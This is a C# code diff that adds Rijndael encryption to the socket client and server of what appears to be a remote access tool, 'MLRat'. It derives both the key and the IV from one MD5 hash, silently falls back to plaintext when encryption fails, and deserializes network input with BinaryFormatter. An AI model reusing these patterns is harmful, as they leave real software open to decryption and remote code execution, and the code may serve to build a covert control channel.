@@ -1,7 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
+﻿using System.Security.Cryptography;
 
 namespace MLRat.Networking
 {
@@ -11,6 +8,7 @@ namespace MLRat.Networking
     using System.Net;
     using System.Net.Sockets;
     using System.Runtime.Serialization.Formatters.Binary;
+    using System.Text;
     using System.Threading;
 
     /// <summary>
@@ -19,6 +17,8 @@ namespace MLRat.Networking
     /// </summary>
     public static class eSock
     {
+
+        
         #region " eSock Server "
 
         public class Server
@@ -44,6 +44,7 @@ namespace MLRat.Networking
 
             private Socket _globalSocket;
             private int _BufferSize = 1000000;
+
             public int BufferSize
             {
                 get
@@ -160,6 +161,9 @@ namespace MLRat.Networking
                 _client.NetworkSocket.BeginReceive(_client.Buffer, 0, _client.Buffer.Length, SocketFlags.None,
                     RetrieveCallback, _client);
 
+                if (_client.Encryption != null)
+                    Packet = _client.Encryption.Decrypt(Packet);
+
                 object[] RetrievedData = Formatter.Deserialize<object[]>(Packet);
                 if (OnDataRetrieved != null && RetrievedData != null)
                     OnDataRetrieved(this, _client, RetrievedData);
@@ -173,6 +177,7 @@ namespace MLRat.Networking
                 public byte[] Buffer { get; set; }
                 public object Tag { get; set; }
                 public Socket NetworkSocket { get; private set; }
+                public eSockEncryptionSettings Encryption { get; set; }
                 public eSockClient(Socket cSock)
                 {
                     NetworkSocket = cSock;
@@ -181,6 +186,7 @@ namespace MLRat.Networking
 
                 public eSockClient(Socket cSock, int bufferSize)
                 {
+                    Encryption = new eSockEncryptionSettings();
                     NetworkSocket = cSock;
                     Buffer = new byte[bufferSize];
                 }
@@ -190,6 +196,8 @@ namespace MLRat.Networking
                     try
                     {
                         byte[] serilisedData = Formatter.Serialize(args);
+                        if (Encryption != null)
+                            serilisedData = Encryption.Encrypt(serilisedData);
                         NetworkSocket.BeginSend(serilisedData, 0, serilisedData.Length, SocketFlags.None, EndSend, null);
                     }
                     catch
@@ -241,6 +249,7 @@ namespace MLRat.Networking
             private int _BufferSize = 1000000;
             public bool Connected { get; private set; }
             public byte[] PacketBuffer { get; private set; }
+            public eSockEncryptionSettings Encryption { get; private set; }
             public int BufferSize
             {
                 get { return _BufferSize; }
@@ -260,6 +269,7 @@ namespace MLRat.Networking
             {
                 _globalSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 Connected = false;
+                Encryption = new eSockEncryptionSettings();
             }
 
             public Client(AddressFamily SocketAddressFamily)
@@ -339,6 +349,8 @@ namespace MLRat.Networking
             public void Send(params object[] data)
             {
                 byte[] serilizedData = Formatter.Serialize(data);
+                if (Encryption != null)
+                    serilizedData = Encryption.Encrypt(serilizedData);
                 _globalSocket.BeginSend(serilizedData, 0, serilizedData.Length, SocketFlags.None, EndSend, null);
             }
 
@@ -347,6 +359,8 @@ namespace MLRat.Networking
                 lock(this)
                 {
                     byte[] serilizedData = Formatter.Serialize(data);
+                    if(Encryption != null)
+                        serilizedData = Encryption.Encrypt(serilizedData);
                     _globalSocket.Send(serilizedData);
                     Thread.Sleep(10);
                 }
@@ -375,6 +389,10 @@ namespace MLRat.Networking
                 byte[] Packet = new byte[packetLength];
                 Buffer.BlockCopy(PacketBuffer, 0, Packet, 0, packetLength);
                 _globalSocket.BeginReceive(PacketBuffer, 0, PacketBuffer.Length, SocketFlags.None, EndRetrieve, null);
+
+                if (Encryption != null)
+                    Packet = Encryption.Decrypt(Packet);
+
                 object[] data = Formatter.Deserialize<object[]>(Packet);
                 if (OnDataRetrieved != null && data != null)
                     OnDataRetrieved(this, data);
@@ -451,5 +469,106 @@ namespace MLRat.Networking
         }
 
         #endregion
+
+        #region " eSock Encryption "
+
+        public static class Hashing
+        {
+            public static byte[] MD5Hash(string val)
+            {
+                byte[] strBytes = Encoding.UTF8.GetBytes(val);
+                using (MD5 md5 = new MD5CryptoServiceProvider())
+                {
+                    return md5.ComputeHash(strBytes);
+                }
+            }
+        }
+
+        public class eSockEncryptionSettings
+        {
+            public IeSockEncryption Method { get; set; }
+            public bool Enabled { get; set; }
+            public string Key { get; set; }
+            public eSockEncryptionSettings()
+            {
+                Enabled = false;
+                Key = string.Empty;
+                Method = new eSockRijndael();
+            }
+            public void GenerateRandomKey()
+            {
+                Key = Guid.NewGuid().ToString("n");
+            }
+            public byte[] Encrypt(byte[] input)
+            {
+                try
+                {
+                    if (Enabled)
+                    {
+                        if (Method == null)
+                            throw new Exception("No method");
+                        return Method.Encrypt(input, Key);
+                    }
+                }
+                catch
+                {
+
+                }
+                return input;
+            }
+            public byte[] Decrypt(byte[] input)
+            {
+                try
+                {
+                    if (Enabled)
+                    {
+                        if (Method == null)
+                            throw new Exception("No method");
+                        return Method.Decrypt(input, Key);
+                    }
+                }
+                catch
+                {
+                    
+                }
+                return input;
+            }
+        }
+
+        public interface IeSockEncryption
+        {
+            byte[] Encrypt(byte[] input, string key);
+            byte[] Decrypt(byte[] input, string key);
+        }
+
+        public class eSockRijndael : IeSockEncryption
+        {
+            public byte[] Decrypt(byte[] input, string key)
+            {
+                using (Rijndael rij = new RijndaelManaged())
+                {
+                    byte[] encryption = Hashing.MD5Hash(key);
+                    rij.Key = encryption;
+                    rij.IV = encryption;
+                    ICryptoTransform crypto = rij.CreateDecryptor();
+                    return crypto.TransformFinalBlock(input, 0, input.Length);
+                }
+            }
+
+            public byte[] Encrypt(byte[] input, string key)
+            {
+                using (Rijndael rij = new RijndaelManaged())
+                {
+                    byte[] encryption = Hashing.MD5Hash(key);
+                    rij.Key = encryption;
+                    rij.IV = encryption;
+                    ICryptoTransform crypto = rij.CreateEncryptor();
+                    return crypto.TransformFinalBlock(input, 0, input.Length);
+                }
+            }
+        }
+
+        #endregion
+
     }
 }
